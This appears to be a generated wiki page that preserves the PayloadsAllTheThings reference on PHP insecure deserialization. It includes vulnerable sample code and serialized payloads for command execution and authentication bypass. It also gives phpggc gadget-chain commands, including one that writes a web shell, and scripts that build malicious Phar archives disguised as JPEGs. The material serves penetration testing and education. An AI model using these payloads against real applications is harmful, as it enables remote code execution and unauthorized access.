---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# PHP Deserialization

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-deserialization-php` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/PHP.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PHP Deserialization](../../topics/insecure-deserialization/php-deserialization.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-deserialization-php |
| name | PHP Deserialization |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md |

## Preserved Source Material

````yaml
_body: "# PHP Deserialization\n\n> PHP Object Injection is an application level vulnerability that could allow an attacker\
  \ to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application\
  \ Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized\
  \ before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc\
  \ serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application\
  \ scope.\n\n## Summary\n\n* [General Concept](#general-concept)\n* [Authentication Bypass](#authentication-bypass)\n* [Object\
  \ Injection](#object-injection)\n* [Finding and Using Gadgets](#finding-and-using-gadgets)\n* [Phar Deserialization](#phar-deserialization)\n\
  * [Real World Examples](#real-world-examples)\n* [References](#references)\n\n## General Concept\n\nThe following magic\
  \ methods will help you for a PHP Object injection\n\n* `__wakeup()` when an object is unserialized.\n* `__destruct()` when\
  \ an object is deleted.\n* `__toString()` when an object is converted to a string.\n\nAlso you should check the `Wrapper\
  \ Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar)\
  \ which use a PHP object injection.\n\nVulnerable code:\n\n```php\n<?php \n    class PHPObjectInjection{\n        public\
  \ $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n\
  \                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n\
  \        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n    \
  \    echo \"\"; # nothing happens here\n    }\n?>\n```\n\nCraft a payload using existing code inside the application.\n\n\
  * Basic serialized data\n\n    ```php\n    a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}\n    ```\n\
  \n* Command execution\n\n    ```php\n    string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\"\
  ;}\"\n    ```\n\n## Authentication Bypass\n\n### Type Juggling\n\nVulnerable code:\n\n```php\n<?php\n$data = unserialize($_COOKIE['auth']);\n\
  \nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin\
  \ = false;\n}\n```\n\nPayload:\n\n```php\na:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}\n```\n\nBecause `true == \"str\"\
  ` is true.\n\n## Object Injection\n\nVulnerable code:\n\n```php\n<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n\
  }\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess\
  \ === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>\n```\n\nPayload:\n\n```php\nO:13:\"ObjectExample\":2:{s:10:\"\
  secretCode\";N;s:5:\"guess\";R:2;}\n```\n\nWe can do an array like this:\n\n```php\na:2:{s:10:\"admin_hash\";N;s:4:\"hmac\"\
  ;R:2;}\n```\n\n## Finding and Using Gadgets\n\nAlso called `\"PHP POP Chains\"`, they can be used to gain RCE on the system.\n\
  \n* In PHP source code, look for `unserialize()` function.\n* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php)\
  \ such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`,\
  \ `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`,\
  \ and `__debugInfo()`:\n    * `__construct()`: PHP allows developers to declare constructor methods for classes. Classes\
  \ which have a constructor method call this method on each newly-created object, so it is suitable for any initialization\
  \ that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)\n\
  \    * `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object,\
  \ or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)\n\
  \    * `__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments`\
  \ argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)\n\
  \    * `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The\
  \ `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)\n\
  \    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing\
  \ properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)\n    * `__set(string $name,\
  \ mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties.\
  \ [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)\n    * `__isset(string $name)`: `__isset()`\
  \ is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)\n\
  \    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or\
  \ non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)\n    * `__sleep()`:\
  \ `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior\
  \ to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of\
  \ that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE**\
  \ is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)\n    * `__wakeup()`: `unserialize()`\
  \ checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any\
  \ resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may\
  \ have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)\n\
  \    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that\
  \ function is executed prior to any serialization. It must construct and return an associative array of key/value pairs\
  \ that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)\n\
  \    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().\
  \  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)\n    * `__toString()`: The __toString()\
  \ method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)\n\
  \    * `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)\n\
  \    * `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)\n\
  \    * `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()`\
  \ method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)\n\
  \    * `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be\
  \ shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)\n\
  \n[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:\n\
  \n* Laravel\n* Symfony\n* SwiftMailer\n* Monolog\n* SlimPHP\n* Doctrine\n* Guzzle\n\n```powershell\nphpggc monolog/rce1\
  \ 'phpinfo();' -s\nphpggc monolog/rce1 assert 'phpinfo()'\nphpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data\nphpggc\
  \ Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini\n```\n\n## Phar Deserialization\n\nUsing `phar://` wrapper, one\
  \ can trigger a deserialization on the specified file like in `file_get_contents(\"phar://./archives/app.phar\")`.\n\nA\
  \ valid PHAR includes four elements:\n\n1. **Stub**: The stub is a chunk of PHP code which is executed when the file is\
  \ accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise,\
  \ there are no restrictions on the contents of a Phar stub.\n2. **Manifest**: Contains metadata about the archive and its\
  \ contents.\n3. **File Contents**: Contains the actual files in the archive.\n4. **Signature**(optional): For verifying\
  \ archive integrity.\n\n* Example of a Phar creation in order to exploit a custom `PDFGenerator`.\n\n    ```php\n    <?php\n\
  \    class PDFGenerator { }\n\n    //Create a new instance of the Dummy class and modify its property\n    $dummy = new\
  \ PDFGenerator();\n    $dummy->callback = \"passthru\";\n    $dummy->fileName = \"uname -a > pwned\"; //our payload\n\n\
  \    // Delete any existing PHAR archive with that name\n    @unlink(\"poc.phar\");\n\n    // Create a new archive\n   \
  \ $poc = new Phar(\"poc.phar\");\n\n    // Add all write operations to a buffer, without modifying the archive on disk\n\
  \    $poc->startBuffering();\n\n    // Set the stub\n    $poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\"\
  );\n\n    /* Add a new file in the archive with \"text\" as its content*/\n    $poc[\"file\"] = \"text\";\n    // Add the\
  \ dummy object to the metadata. This will be serialized\n    $poc->setMetadata($dummy);\n    // Stop buffering and write\
  \ changes to disk\n    $poc->stopBuffering();\n    ?>\n    ```\n\n* Example of a Phar creation with a `JPEG` magic byte\
  \ header since there is no restriction on the content of stub.\n\n    ```php\n    <?php\n    class AnyClass {\n        public\
  \ $data = null;\n        public function __construct($data) {\n            $this->data = $data;\n        }\n        \n \
  \       function __destruct() {\n            system($this->data);\n        }\n    }\n\n    // create new Phar\n    $phar\
  \ = new Phar('test.phar');\n    $phar->startBuffering();\n    $phar->addFromString('test.txt', 'text');\n    $phar->setStub(\"\
  \\xff\\xd8\\xff\\n<?php __HALT_COMPILER(); ?>\");\n\n    // add object of any class as meta data\n    $object = new AnyClass('whoami');\n\
  \    $phar->setMetadata($object);\n    $phar->stopBuffering();\n    ```\n\n## Real World Examples\n\n* [Vanilla Forums ImportController\
  \ index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)\n\
  * [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)\n\
  * [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)\n\
  * [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)\n\
  \n## References\n\n* [CTF writeup: PHP object injection in kaspersky CTF - Jaimin Gohel - November 24, 2018](https://web.archive.org/web/20210514112950/https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)\n\
  * [ECSC 2019 Quals Team France - Jack The Ripper Web - noraj - May 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)\n\
  * [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 1 - Rémi Matasse - September 12, 2023](https://web.archive.org/web/20230915040126/https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)\n\
  * [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 2 - Rémi Matasse - October 11, 2023](https://web.archive.org/web/20231017130212/https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)\n\
  * [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - xanhacks - August 11, 2022](https://web.archive.org/web/20250926045827/https://www.xanhacks.xyz/p/php-gadget-chain/)\n\
  * [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://web.archive.org/web/20200929143500/https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)\n\
  * [phar:// deserialization - HackTricks - July 19, 2024](https://web.archive.org/web/20220819225041/https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)\n\
  * [PHP deserialization attacks and a new gadget chain in Laravel - Mathieu Farrell - February 13, 2024](https://web.archive.org/web/20240213181951/https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)\n\
  * [PHP Generic Gadget - Charles Fol - July 4, 2017](https://www.ambionics.io/blog/php-generic-gadget-chains)\n* [PHP Internals\
  \ Book - Serialization - jpauli - June 15, 2013](https://web.archive.org/web/20130615052058/http://www.phpinternalsbook.com:80/classes_objects/serialization.html)\n\
  * [PHP Object Injection - Egidio Romano - April 24, 2020](https://web.archive.org/web/20130313225253/https://www.owasp.org/index.php/PHP_Object_Injection)\n\
  * [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://web.archive.org/web/20200903232359/https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)\n\
  * [PHP unserialize - php.net - March 29, 2001](https://web.archive.org/web/20260219122641/https://www.php.net/manual/en/function.unserialize.php)\n\
  * [POC2009 Shocking News in PHP Exploitation - Stefan Esser - May 23, 2015](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)\n\
  * [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://web.archive.org/web/20241010013739/https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)\n\
  * [TSULOTT Web challenge write-up - MeePwn CTF - Rawsec - July 15, 2017](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)\n\
  * [Utilizing Code Reuse/ROP in PHP - Stefan Esser - June 15, 2020](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)"
_relative_path: Insecure Deserialization/PHP.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/PHP.md
````
